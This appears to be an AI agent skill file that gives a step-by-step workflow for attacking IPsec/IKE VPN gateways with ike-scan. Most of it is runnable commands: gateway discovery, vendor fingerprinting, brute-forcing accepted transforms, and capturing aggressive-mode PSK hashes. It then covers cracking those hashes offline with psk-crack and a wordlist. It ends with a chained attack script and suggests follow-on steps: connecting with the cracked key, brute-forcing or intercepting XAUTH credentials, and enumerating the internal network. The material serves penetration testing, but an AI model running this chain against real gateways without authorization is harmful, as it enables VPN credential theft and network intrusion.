---
name: ike-scan
description: Discover, fingerprint and attack IPsec/IKE VPN gateways on udp/500 and 4500 with ike-scan — main vs aggressive mode, transform enumeration, Vendor-ID and backoff fingerprinting, IKEv2, NAT-T, aggressive-mode PSK hash capture and offline cracking with psk-crack.
license: Proprietary
compatibility: Linux with ike-scan and psk-crack installed; root/CAP_NET_RAW for source port 500
metadata:
  author: Section9Labs
  phase: service-attack
---

# ike-scan — IPsec/IKE gateway attack

ike-scan speaks raw IKE (ISAKMP) on udp/500 (and udp/4500 NAT-T). It finds VPN
gateways that port scanners miss (UDP, often silent to malformed probes),
fingerprints vendor/firmware, enumerates accepted crypto, and — when
aggressive mode is enabled — captures a PSK hash crackable offline.

Run as root: IKE endpoints frequently only answer packets FROM source port
500, which ike-scan uses by default when privileged.

## Discovery

```bash
# Single gateway
sudo ike-scan 203.0.113.50

# Host list (feed alive.txt or a dedicated file)
sudo ike-scan -f gateways.txt

# A CIDR: expand it into a host list first (ike-scan takes hosts, not CIDRs)
nmap -sL -n 203.0.113.0/24 | awk '/Nmap scan report/{print $NF}' > hosts.txt
sudo ike-scan -f hosts.txt

# Save everything for parsing
sudo ike-scan -M -f hosts.txt | tee ike_main.txt
```

Interpreting replies:
- `Main Mode Handshake returned` — IKEv1 gateway, accepted one of the default
  proposed transforms. Confirmed VPN endpoint.
- `Notify message ... NO-PROPOSAL-CHOSEN` — a gateway IS there, it just
  rejected the default transform set → go brute transforms with `--trans`.
- `Aggressive Mode Handshake returned` — jackpot (see PSK capture below).
- No reply at all — maybe nothing there, maybe it only answers aggressive
  mode, or only with a valid group ID, or only on 4500. Try all three before
  giving up:

```bash
sudo ike-scan -A 203.0.113.50                  # aggressive mode
sudo ike-scan -A --id=GroupVPN 203.0.113.50    # with a candidate group ID
sudo ike-scan --sport=4500 --dport=4500 --nat-t 203.0.113.50   # NAT-T
sudo ike-scan --ikev2 203.0.113.50             # IKEv2-only gateway
```

## Main vs aggressive mode — why aggressive leaks the PSK

- **Main mode** (default, 6 messages): the Diffie-Hellman exchange completes
  BEFORE any authentication data flows, so the PSK-based hash is sent inside
  the already-encrypted channel. Nothing crackable is exposed to a probe.
- **Aggressive mode** (`-A` / `--aggressive`, 3 messages): to save round
  trips, the responder sends its identity AND the authentication hash
  (HASH_R = PRF(SKEYID, ...) keyed from the PSK) in cleartext in message 2 —
  before any encryption exists. Anyone who sends message 1 receives material
  for an offline dictionary/brute-force attack on the PSK. No valid
  credentials needed; one UDP packet.

Many gateways enable aggressive mode because it is required for dynamic-IP /
roaming clients with PSK auth. Some only respond when the proposed identity
matches a configured group/user ID — supply it with `--id`:

```bash
sudo ike-scan -A --id=vpnusers 203.0.113.50
sudo ike-scan -A --id=admin@example.com 203.0.113.50
```

A reply containing an `ID` payload + `Hash` payload = aggressive mode with PSK
is live. That alone is a reportable finding; the crack is the proof.

## PSK hash capture and offline cracking

```bash
# 1. Capture: -P writes PSK-crack parameters (g_xr, g_xi, cky_r, cky_i,
#    sai_b, idir_b, ni_b, nr_b, hash_r) to a file
sudo ike-scan -A --id=GroupVPN -P psk-203.0.113.50.txt 203.0.113.50
# (equivalently: --pskcrack=psk-203.0.113.50.txt; bare -P prints to stdout)

# 2. Crack offline — dictionary first
psk-crack -d /usr/share/wordlists/rockyou.txt psk-203.0.113.50.txt

# 3. Then brute force: length 1-6, lowercase+digits charset
psk-crack -b 6 -c 'abcdefghijklmnopqrstuvwxyz0123456789' psk-203.0.113.50.txt
```

psk-crack auto-detects whether the hash is HMAC-MD5 or HMAC-SHA1 from the
captured parameters. Success prints `key "secret123" matches SHA1 hash ...`.
It is fully offline — zero further packets to the target — so throw unlimited
wordlists/rules at it (or convert for hashcat mode 5300/5400 for GPU speed).

With the PSK cracked, connect as a client (strongSwan/vpnc) using the group
ID + PSK, then attack the inner authentication (XAUTH brute force, or
MitM XAUTH credential capture with fiked) and enumerate the internal network.

## Transform enumeration — `--trans`

Default ike-scan proposals cover only 8 common transforms. Gateways answering
`NO-PROPOSAL-CHOSEN` (or nothing) often accept something else. A transform is
`enc,hash,auth,group`:

```bash
# Single transform: 3DES, SHA1, PSK, DH group 2
sudo ike-scan --trans=5,2,1,2 203.0.113.50

# Full brute force of the common value space (main mode):
for enc in 1 5 7/128 7/192 7/256; do
 for hash in 1 2; do
  for auth in 1 3 64221 65001; do
   for grp in 1 2 5 14; do
    sudo ike-scan -M --trans="$enc,$hash,$auth,$grp" 203.0.113.50 \
      | grep -q "Handshake returned" \
      && echo "ACCEPTED: $enc,$hash,$auth,$grp"
   done; done; done; done

# Same loop with -A to find aggressive-mode-only transform sets
```

Value tables (enc: 1=DES 5=3DES 7/N=AES-N; hash: 1=MD5 2=SHA1; auth: 1=PSK
3=RSA-sig 64221=hybrid 65001=XAUTH-PSK; group: 1=modp768 2=modp1024
5=modp1536 14=modp2048) and the full methodology are in
`references/transforms-and-fingerprint.md`. Every accepted transform is crypto
intelligence: DES/MD5/modp768 acceptance is itself a weak-crypto finding, and
auth=1/65001 acceptance tells you a PSK attack path exists.

## Fingerprinting

**Vendor IDs (`-M` multiline):** `-M` splits payload decoding onto separate
lines; VID payloads identify the implementation:

```bash
sudo ike-scan -M 203.0.113.50
#   VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
#   VID=1f07f70eaa6514d3b0fa96542a500100 (Cisco Unity)
#   VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

Cisco Unity + XAUTH VIDs = Cisco ASA/IOS EasyVPN (group-ID aggressive-mode
attack surface); other hashes map to Fortinet, Check Point, strongSwan,
Windows, Juniper — table in the reference file.

**Backoff fingerprinting (`--showbackoff`):** vendors retransmit IKE with
distinctive timing patterns. ike-scan records reply timing and matches against
its backoff pattern database:

```bash
sudo ike-scan --showbackoff -M 203.0.113.50
# ...waits ~60s after the handshake...
# 203.0.113.50  Implementation guess: Cisco VPN Concentrator
```

Use when no VIDs are returned. Scan few hosts at a time — timing data gets
noisy with many concurrent targets.

## IKEv2 and NAT-T

```bash
# IKEv2 (SA_INIT probe). No aggressive mode exists in v2 — no PSK leak —
# but it confirms the gateway and returns transforms/VIDs.
sudo ike-scan --ikev2 -M 203.0.113.50

# NAT-Traversal: some gateways listen only on udp/4500 (ESP-in-UDP)
sudo ike-scan --nat-t --sport=4500 --dport=4500 -M 203.0.113.50
```

Probe 500 AND 4500, v1 AND v2 — gateways frequently answer only one
combination.

## Full chained example — 203.0.113.50

```bash
# 1. Discover + fingerprint (v1 main, VIDs)
sudo ike-scan -M 203.0.113.50 | tee ike-203.0.113.50-main.txt

# 2. Backoff fingerprint if VIDs were absent
sudo ike-scan -M --showbackoff 203.0.113.50 | tee -a ike-203.0.113.50-main.txt

# 3. Aggressive mode, trying likely group IDs
for id in vpn GroupVPN remote employees admin example.com; do
  sudo ike-scan -A --id="$id" -M 203.0.113.50 | tee -a ike-203.0.113.50-aggr.txt
done

# 4. On "Aggressive Mode Handshake returned": capture the PSK hash
sudo ike-scan -A --id=GroupVPN -P psk-203.0.113.50.txt 203.0.113.50

# 5. Crack offline
psk-crack -d /usr/share/wordlists/rockyou.txt psk-203.0.113.50.txt \
  || psk-crack -b 6 psk-203.0.113.50.txt

# 6. Also check v2 / NAT-T surface
sudo ike-scan --ikev2 -M 203.0.113.50 | tee ike-203.0.113.50-v2.txt
sudo ike-scan --nat-t --sport=4500 --dport=4500 -M 203.0.113.50 \
  | tee ike-203.0.113.50-natt.txt

# 7. Parse everything into gateway records + follow-up work units
python3 scripts/parse_ike.py ike-203.0.113.50-*.txt \
  -o gateways.json --units units.json
```

## Handoff

`parse_ike.py` emits one JSON record per gateway (handshake? mode, transform,
VIDs, backoff guess, PSK-capture status) plus `units.json` — a clean JSON
array (first byte `[`) of `{id,title,targets,hints}` follow-ups such as
"test aggressive mode on 203.0.113.50", "crack captured PSK for
203.0.113.50", "brute-force transforms on ...". Feed it to rupu `for_each:` /
`dispatch`, mark gateways as coverage assets, and report aggressive-mode PSK
exposure / cracked PSK / weak transforms as findings — see
`references/rupu.md`.
